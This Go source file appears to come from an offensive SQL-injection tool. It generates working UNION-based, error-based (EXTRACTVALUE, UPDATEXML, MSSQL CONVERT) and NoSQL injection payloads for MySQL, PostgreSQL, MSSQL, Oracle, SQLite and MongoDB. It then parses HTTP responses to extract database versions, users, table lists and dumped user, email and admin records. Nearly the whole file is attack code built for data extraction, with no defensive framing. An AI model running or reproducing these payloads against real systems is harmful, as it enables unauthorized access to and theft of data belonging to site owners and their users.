package extractor

import (
	"regexp"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// ExtractionJob décrit une tentative d'extraction.
type ExtractionJob struct {
	DataType DataType
	Payload  string
	Method   string
}

type DataType = models.DataType

const (
	DataVersion  = models.DataVersion
	DataDatabase = models.DataDatabase
	DataUser     = models.DataUser
	DataTables   = models.DataTables
	DataColumns  = models.DataColumns
	DataDump     = models.DataDump
)

// BuildJobs génère les jobs d'extraction selon le DBMS et le type de vuln.
func BuildJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
	dbms = normalizeDBMS(dbms)

	switch vulnType {
	case models.NoSQL:
		return nosqlJobs()
	default:
		return sqliJobs(dbms, vulnType)
	}
}

func sqliJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
	var jobs []ExtractionJob

	// Déterminer le nombre de colonnes UNION (test 1-4)
	unionCols := []int{1, 2, 3, 4}

	for _, cols := range unionCols {
		for _, def := range sqliDefs(dbms) {
			selectExpr := buildUnionSelect(def.expr, cols)
			jobs = append(jobs, ExtractionJob{
				DataType: def.dtype,
				Payload:  `' UNION SELECT ` + selectExpr + `--`,
				Method:   "union",
			})
		}
	}

	// Error-based (MySQL principalement)
	if dbms == "mysql" || dbms == "generic" || dbms == "" {
		for _, def := range errorDefs() {
			jobs = append(jobs, ExtractionJob{
				DataType: def.dtype,
				Payload:    def.payload,
				Method:     "error",
			})
		}
	}

	// MSSQL error cast
	if dbms == "mssql" || dbms == "generic" || dbms == "" {
		jobs = append(jobs, ExtractionJob{
			DataType: DataVersion,
			Payload:  `' AND 1=CONVERT(int,@@version)--`,
			Method:   "error",
		})
	}

	_ = vulnType
	return jobs
}

type sqliDef struct {
	dtype DataType
	expr  string
}

func sqliDefs(dbms string) []sqliDef {
	switch dbms {
	case "postgresql":
		return []sqliDef{
			{DataVersion, "version()"},
			{DataDatabase, "current_database()"},
			{DataUser, "current_user"},
			{DataTables, "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')"},
		}
	case "mssql":
		return []sqliDef{
			{DataVersion, "@@version"},
			{DataDatabase, "db_name()"},
			{DataUser, "system_user"},
			{DataTables, "(SELECT TOP 1 name FROM sys.tables)"},
		}
	case "oracle":
		return []sqliDef{
			{DataVersion, "banner FROM v$version WHERE ROWNUM=1"},
			{DataUser, "user FROM dual"},
		}
	case "sqlite":
		return []sqliDef{
			{DataVersion, "sqlite_version()"},
			{DataTables, "name FROM sqlite_master WHERE type='table'"},
		}
	default: // mysql
		return []sqliDef{
			{DataVersion, "@@version"},
			{DataDatabase, "database()"},
			{DataUser, "user()"},
			{DataTables, "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"},
		}
	}
}

type errorDef struct {
	dtype   DataType
	payload string
}

func errorDefs() []errorDef {
	return []errorDef{
		{DataVersion, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--`},
		{DataDatabase, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--`},
		{DataUser, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--`},
		{DataTables, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--`},
		{DataVersion, `1' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)--`},
	}
}

func nosqlJobs() []ExtractionJob {
	return []ExtractionJob{
		{DataDump, `{"$regex":".*"}`, "nosql"},
		{DataDump, `{"$ne":null}`, "nosql"},
		{DataDump, `{"$gt":""}`, "nosql"},
		{DataUser, `{"username":{"$regex":".*"}}`, "nosql"},
		{DataTables, `0]; return db.getCollectionNames(); var a=[0`, "nosql"},
	}
}

func buildUnionSelect(expr string, cols int) string {
	if cols <= 1 {
		return expr
	}
	parts := []string{expr}
	for i := 1; i < cols; i++ {
		parts = append(parts, "NULL")
	}
	return strings.Join(parts, ",")
}

func buildNullList(cols int) string {
	parts := make([]string, cols)
	for i := range parts {
		parts[i] = "NULL"
	}
	return strings.Join(parts, ",")
}

func normalizeDBMS(dbms string) string {
	dbms = strings.ToLower(dbms)
	if dbms == "" {
		return "mysql"
	}
	return dbms
}

// ParseResponse extrait les données de la réponse HTTP.
func ParseResponse(body, payload, method string, dtype DataType) (string, bool) {
	// EXTRACTVALUE / UPDATEXML : données entre ~
	reTilde := regexp.MustCompile(`~([^~]+)~`)
	if m := reTilde.FindStringSubmatch(body); len(m) > 1 {
		return strings.TrimSpace(m[1]), true
	}

	// Versions MySQL
	reMySQLVer := regexp.MustCompile(`(?i)(\d+\.\d+\.\d+[-\w]*(?:mysql|mariadb)?[^\s<"]*)`)
	if dtype == DataVersion {
		if m := reMySQLVer.FindStringSubmatch(body); len(m) > 1 {
			return m[1], true
		}
	}

	// PostgreSQL version
	rePG := regexp.MustCompile(`(?i)(PostgreSQL \d+\.\d+[^\s<"]*)`)
	if dtype == DataVersion {
		if m := rePG.FindStringSubmatch(body); len(m) > 1 {
			return m[1], true
		}
	}

	// MSSQL
	reMSSQL := regexp.MustCompile(`(?i)(Microsoft SQL Server \d+[^\s<"]*)`)
	if dtype == DataVersion {
		if m := reMSSQL.FindStringSubmatch(body); len(m) > 1 {
			return m[1], true
		}
	}

	// Noms de tables / database en réponse UNION
	if dtype == DataDatabase || dtype == DataTables || dtype == DataUser {
		// Réponse nettoyée sans le payload réfléchi
		cleaned := strings.ToLower(body)
		if strings.Contains(strings.ToLower(payload), "database()") && !strings.Contains(cleaned, "union select") {
			reCMS := regexp.MustCompile(`(?i)\b([a-z][a-z0-9_]{2,20})\b`)
			if m := reCMS.FindAllString(body, -1); len(m) > 0 {
				for _, s := range m {
					if !isNoise(s) && len(s) > 3 {
						return s, true
					}
				}
			}
		}
	}

	// NoSQL dump JSON
	if dtype == DataDump || dtype == DataUser {
		if strings.Contains(body, `"users"`) || strings.Contains(body, `"email"`) {
			return truncate(body, 500), true
		}
		if strings.Contains(body, `"tenants"`) || strings.Contains(body, `"admin"`) {
			return truncate(body, 500), true
		}
	}

	// UNION générique : contenu nouveau hors payload
	if method == "union" && len(body) > 10 {
		cleaned := body
		if payload != "" {
			cleaned = strings.ReplaceAll(cleaned, payload, "")
		}
		// Version dans réponse
		for _, re := range []*regexp.Regexp{
			regexp.MustCompile(`(?i)\d+\.\d+\.\d+[-\w.]*`),
			regexp.MustCompile(`(?i)root@[\w%.]+`),
			regexp.MustCompile(`(?i)[a-z_]+,[a-z_]+,[a-z_]+`), // tables list
		} {
			if m := re.FindString(cleaned); m != "" && !isNoise(m) {
				return m, true
			}
		}
	}

	return "", false
}

func isNoise(s string) bool {
	noise := map[string]bool{
		"null": true, "select": true, "union": true, "html": true,
		"body": true, "http": true, "result": true, "error": true,
		"the": true, "and": true, "for": true, "from": true,
	}
	return noise[strings.ToLower(s)]
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
